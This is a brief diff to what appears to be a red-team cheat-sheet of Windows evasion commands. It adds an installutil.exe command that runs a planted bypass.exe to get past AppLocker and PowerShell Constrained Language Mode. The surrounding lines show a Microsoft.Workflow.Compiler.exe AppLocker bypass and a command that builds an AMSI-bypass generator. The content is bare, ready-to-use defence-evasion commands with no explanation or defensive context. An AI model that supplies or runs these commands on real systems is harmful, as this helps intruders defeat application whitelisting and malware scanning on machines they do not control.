@@ -3,6 +3,9 @@
 # applocker bypass
 C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe run.xml results.xml
 
+# applocker powershell CLM bypass
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\bypass.exe
+
 # offline bypass amsi generator
 sudo mcs /opt/win/AMSIFailGenerator.cs && sudo mono /opt/win/AMSIFailGenerator.exe
 
